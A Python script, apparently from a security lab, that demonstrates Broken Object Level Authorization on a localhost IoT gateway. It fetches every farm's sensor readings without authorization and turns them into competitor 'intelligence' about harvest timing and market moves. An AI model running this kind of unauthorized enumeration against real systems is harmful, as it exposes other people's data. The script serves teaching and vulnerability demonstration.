#!/usr/bin/env python3
"""
BOLA Exploitation Script - Unauthorized Gateway Access

This script demonstrates how a malicious actor can exploit Broken Object Level
Authorization (BOLA) to access sensor data across multiple farms through the IoT gateway.

In this agricultural scenario:
- The IoT gateway should enforce access controls based on farm ownership
- But due to BOLA vulnerabilities, any user can access any sensor data
- This allows competitive intelligence gathering across farms

Agricultural implications:
- Monitoring competitors' growing conditions
- Determining optimal harvest times for market advantages
- Predicting supply fluctuations for price manipulation
- Inferring proprietary growing techniques
"""

import requests
import json
import time
from datetime import datetime
from tabulate import tabulate

# Base URL of the IoT gateway
GATEWAY_URL = "http://localhost:48080"  # Adjust port as needed

def get_all_sensors():
    """Get data for all sensors through the gateway"""
    url = f"{GATEWAY_URL}/data"
    print(f"Requesting: {url}")
    
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Failed to get data: {response.status_code}")
            return {}
    except requests.exceptions.RequestException as e:
        print(f"Error accessing gateway: {e}")
        return {}

def get_sensor_data(sensor_id):
    """Get data for a specific sensor"""
    url = f"{GATEWAY_URL}/data/{sensor_id}"
    print(f"Requesting: {url}")
    
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Failed to get data for {sensor_id}: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error accessing gateway: {e}")
        return None

def analyze_agricultural_implications(sensor_data):
    """Analyze data for agricultural insights"""
    if not sensor_data:
        return {}
    
    # Extract basic sensor information
    temp = sensor_data.get("temperature", "N/A")
    timestamp = sensor_data.get("timestamp", 0)
    
    # Simulated agricultural analysis (in a real exploit, this would use actual data)
    analysis = {
        "current_conditions": "optimal" if 20 <= temp <= 25 else "suboptimal",
        "estimated_growth_stage": "flowering" if temp > 22 else "vegetative",
        "estimated_harvest_window": "2-3 weeks" if temp > 24 else "4-5 weeks",
        "potential_issues": "heat stress" if temp > 30 else "cold stress" if temp < 15 else "none detected",
        "market_implications": "likely early harvest" if temp > 26 else "likely delayed harvest"
    }
    
    return analysis

def main():
    """Main exploitation demonstration"""
    print("="*80)
    print("üö® BOLA VULNERABILITY DEMONSTRATION: CROSS-FARM MONITORING üö®")
    print("="*80)
    print("\nThis demonstration shows how a malicious actor can access sensor data")
    print("across multiple farms by exploiting gateway access vulnerabilities.")
    print("\nScenario: A malicious farmer is attempting to gather intelligence on")
    print("all neighboring farms to gain market advantages.\n")
    
    # 1. First, get all sensor data to discover what's available
    print("üîç DISCOVERING ALL FARM SENSORS WITHOUT AUTHORIZATION")
    print("-"*70)
    all_data = get_all_sensors()
    
    # Exit if we couldn't get any data
    if not all_data:
        print("Unable to access gateway data. Please ensure the IoT gateway is running.")
        return
    
    # Create a summary table of all discovered sensors
    sensor_summary = []
    for key, data in all_data.items():
        # Extract sensor ID from either the key or the data
        sensor_id = data.get("sensor_id", key.split("/")[-1] if "/" in key else key)
        
        # Extract other relevant information
        temp = data.get("temperature", "N/A")
        unit = data.get("unit", "¬∞C")
        location = data.get("location", "unknown")
        confidence = data.get("confidence", "N/A")
        
        sensor_summary.append([sensor_id, temp, unit, location, confidence])
    
    # Print the summary table
    headers = ["Sensor ID", "Temperature", "Unit", "Location", "Data Confidence"]
    print("\nDiscovered sensors across all farms:")
    print(tabulate(sensor_summary, headers=headers, tablefmt="grid"))
    
    time.sleep(2)  # Pause for readability
    
    print("\n" + "="*70 + "\n")
    
    # 2. Now target specific farms for detailed information
    farm_sensors = {
        "Farm A": ["TEMP001", "TEMP002"],
        "Farm B": ["TEMP003"],
        "Farm C": ["TEMP004"]
    }
    
    print("üîì UNAUTHORIZED ACCESS: Detailed monitoring of specific farm sensors")
    print("-"*70)
    
    for farm_name, sensors in farm_sensors.items():
        print(f"\nüì° Targeting {farm_name}'s sensors:")
        
        for sensor_id in sensors:
            print(f"\n  Accessing {sensor_id}...")
            sensor_data = get_sensor_data(sensor_id)
            
            if sensor_data:
                # Basic sensor information
                temp = sensor_data.get("temperature", "N/A")
                unit = sensor_data.get("unit", "¬∞C")
                timestamp = sensor_data.get("timestamp", 0)
                formatted_time = datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S') if timestamp else "N/A"
                
                print(f"  üå°Ô∏è Temperature: {temp} {unit}")
                print(f"  üïí Reading time: {formatted_time}")
                
                # Perform agricultural analysis
                analysis = analyze_agricultural_implications(sensor_data)
                
                if analysis:
                    print("\n  üîç Agricultural Intelligence:")
                    print(f"    ‚Ä¢ Current growing conditions: {analysis.get('current_conditions', 'unknown')}")
                    print(f"    ‚Ä¢ Estimated growth stage: {analysis.get('estimated_growth_stage', 'unknown')}")
                    print(f"    ‚Ä¢ Estimated harvest window: {analysis.get('estimated_harvest_window', 'unknown')}")
                    print(f"    ‚Ä¢ Potential issues: {analysis.get('potential_issues', 'unknown')}")
                    print(f"    ‚Ä¢ Market implications: {analysis.get('market_implications', 'unknown')}")
            else:
                print(f"  ‚ùå Failed to access data for {sensor_id}")
    
    print("\n\n" + "="*70)
    print("\nüîç VULNERABILITY ANALYSIS:")
    print("This BOLA vulnerability in the IoT gateway allows unauthorized access to sensor data")
    print("across all farms in the network. In agriculture, this could enable:")
    print("  - Monitoring of competitors' growing conditions and practices")
    print("  - Prediction of harvest times and crop yields")
    print("  - Market manipulation by anticipating supply fluctuations")
    print("  - Theft of proprietary growing techniques and environmental settings")
    print("  - Coordination of optimal selling times to undercut competitors")

if __name__ == "__main__":
    main()